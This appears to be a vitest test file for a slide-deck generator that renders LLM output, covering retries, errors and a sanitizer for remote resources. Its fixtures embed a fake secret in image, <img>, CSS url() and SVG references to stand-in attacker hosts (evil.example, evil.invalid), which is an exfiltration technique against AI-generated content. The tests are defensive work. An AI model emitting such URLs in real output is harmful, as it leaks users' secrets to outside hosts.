import { describe, it, expect, vi } from "vitest";
import { runGenerateDeck } from "../src/generate-deck";
import { Window } from "happy-dom";
import { renderMarkdown } from "../src/vendor/deck-core/pure/render/md2html";

const win = new Window({ settings: { disableIframePageLoading: true, disableJavaScriptEvaluation: true, disableCSSFileLoading: true, disableJavaScriptFileLoading: true } });
const parseHtml = (html: string): Document => new win.DOMParser().parseFromString(html, "text/html") as unknown as Document;
const baseMessages = [{ role: "user" as const, content: "src" }];
function deps(client: any, over: any = {}) {
  return { client, messages: baseMessages, themeKey: "dark", parseHtml, signal: new AbortController().signal, onState: () => {}, ...over };
}

describe("runGenerateDeck", () => {
  it("happy path: returns a themed deck, not incomplete, no fallback", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A\n\n---\n\n# B", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("ok");
    expect(r.markdown).toContain("theme: dark");
    expect(r.incomplete).toBe(false);
    expect(r.usedFallback).toBe(false);
  });

  it("writes a source backlink into the frontmatter when sourceLink is given", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client, { sourceLink: "[[Original]]" }));
    expect(r.markdown).toContain('source: "[[Original]]"');
    expect(r.markdown).toContain("theme: dark");
  });

  it("marks incomplete on finish_reason length", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", finishReason: "length", usedFallback: false })) };
    expect((await runGenerateDeck(deps(client))).incomplete).toBe(true);
  });

  it("propagates usedFallback from the client (C7)", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", usedFallback: true })) };
    expect((await runGenerateDeck(deps(client))).usedFallback).toBe(true);
  });

  it("retries once on a format-fatal result, then succeeds (with retry feedback)", async () => {
    const client = { generate: vi.fn() };
    client.generate.mockResolvedValueOnce({ content: "", reasoning: "", usedFallback: false });
    client.generate.mockResolvedValueOnce({ content: "# Good", reasoning: "", usedFallback: false });
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("ok");
    expect(client.generate).toHaveBeenCalledTimes(2);
    expect(client.generate.mock.calls[1][0].length).toBeGreaterThan(baseMessages.length);
  });

  it("gives up after 2 fatal runs with kind:format (hard cap)", async () => {
    const client = { generate: vi.fn(async () => ({ content: "", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("fatal");
    expect(r.kind).toBe("format");
    expect(client.generate).toHaveBeenCalledTimes(2);
  });

  it("returns fatal kind:server immediately on an envelope error (NO retry)", async () => {
    const client = { generate: vi.fn(async () => { throw new Error("model not loaded"); }) };
    const r = await runGenerateDeck(deps(client));
    expect(r).toMatchObject({ status: "fatal", error: "model not loaded", kind: "server" });
    expect(client.generate).toHaveBeenCalledTimes(1);
  });

  it("returns aborted on AbortError", async () => {
    const client = { generate: vi.fn(async () => { const e = new Error("Aborted"); e.name = "AbortError"; throw e; }) };
    expect((await runGenerateDeck(deps(client))).status).toBe("aborted");
  });

  describe("restaurierte Antwort: Fernquellen werden entschaerft (Sicherheitsgrenze der Schwaerzung)", () => {
    const SECRET = "sk-abcdef0123456789abcdef";
    const run = async (content: string) => {
      const client = { generate: vi.fn(async () => ({ content, reasoning: "", usedFallback: false })) };
      const r = await runGenerateDeck(deps(client));
      expect(r.status).toBe("ok");
      return r.markdown ?? "";
    };

    /** Laedt das gerenderte HTML etwas von aussen? (img/src, url() — was die Vorschau beim Rendern holt) */
    const loadsRemote = (markdown: string): boolean => {
      const html = renderMarkdown({ markdown, resolveEmbed: () => null }).html;
      return /<(?:img|iframe|video|audio|source)\b[^>]*\bsrc=["']?https?:/i.test(html) || /url\(\s*["']?https?:/i.test(html);
    };

    it.each([
      ["Markdown-Bild", `# A\n\n![x](https://evil.example/?d=${SECRET})`],
      ["rohes <img>", `# A\n\n<img src="https://evil.example/h?d=${SECRET}">`],
      ["url() in style", `# A\n\n<div style="background:url(https://evil.example/b?d=${SECRET})">x</div>`],
    ])("%s laedt nach der Entschaerfung nichts mehr von aussen — und ohne sie schon (Gegenprobe)", async (_name, content) => {
      expect(loadsRemote(content)).toBe(true);
      expect(loadsRemote(await run(content))).toBe(false);
    });

    it("ein dataviewjs-Block laeuft nicht mehr als Prozessor-Fence", async () => {
      const md = await run("# A\n\n```dataviewjs\ndv.pages()\n```");
      expect(md).not.toMatch(/^```dataviewjs/m);
    });

    it("ein Deck mit Mermaid, Direktive, Code-Fence, Datei-Embed und data:-Bild bleibt unveraendert", async () => {
      const body = [
        "# A", "", "<!-- layout: two-column -->", "", "![[bild.png]]", "",
        "```mermaid", "graph TD; A-->B", "```", "", "```ts", "const x = 1;", "```", "",
        "![lokal](data:image/png;base64,AAAA)", "", "![rel](bilder/a.png)", "",
        "---", "", "# B", "", "[Link](https://example.org)",
      ].join("\n");
      const md = await run(body);
      for (const stueck of ["<!-- layout: two-column -->", "![[bild.png]]", "```mermaid", "```ts", "![lokal](data:image/png;base64,AAAA)", "![rel](bilder/a.png)", "[Link](https://example.org)"]) {
        expect(md).toContain(stueck);
      }
    });
  });

  describe("zweite Schicht", () => {
    const SVG = '<svg><rect fill="url(https://evil.invalid/s.svg#a)"/></svg>';
    const gen = (content: string) => ({ generate: vi.fn(async () => ({ content, reasoning: "", usedFallback: false })) });

    it("eine Fernquelle, die die Regex-Schicht faengt, laeuft unveraendert durch (Bild wird Text, nichts gemeldet)", async () => {
      const r = await runGenerateDeck(deps(gen("# A\n\n![x](https://evil.invalid/x.png)")));
      expect(r.status).toBe("ok");
      expect(r.markdown).toContain("x (https://evil.invalid/x.png)");
      expect(r.sanitizedSlides).toEqual([]);
    });

    it("eine Quelle, die nur der DOM-Durchgang faengt, wird als Text gespeichert; die uebrigen Folien bleiben", async () => {
      const r = await runGenerateDeck(deps(gen(`# A\n\n---\n\n# B\n\n${SVG}\n\n---\n\n# C`)));
      expect(r.status).toBe("ok");
      expect(r.sanitizedSlides).toEqual([2]);
      expect(r.markdown).not.toContain("<svg>");
      expect(r.markdown).toContain("# A");
      expect(r.markdown).toContain("# C");
    });

    it("bleibt nach der Folien-Entschaerfung ein Fund: fatal/remote, kein Retry, nichts zurueckgegeben", async () => {
      const client = gen(`# A\n\n${SVG}`);
      const r = await runGenerateDeck(deps(client, { neutralizeSlide: (m: string) => m }));
      expect(r.status).toBe("fatal");
      expect(r.kind).toBe("remote");
      expect(r.markdown).toBeUndefined();
      expect(client.generate).toHaveBeenCalledTimes(1);
      expect(r.error).not.toContain("evil.invalid");
    });

    it("ein Deck mit Mermaid, Direktive, Embed und relativem Bild geht byte-gleich durch (bis auf Thema)", async () => {
      const body = "<!-- layout: columns -->\n# A\n\n![[logo.png]]\n\n![r](img/a.png)\n\n```mermaid\ngraph TD; A-->B\n```";
      const r = await runGenerateDeck(deps(gen(body)));
      expect(r.status).toBe("ok");
      expect(r.sanitizedSlides).toEqual([]);
      expect(r.markdown).toContain(body);
    });
  });
});
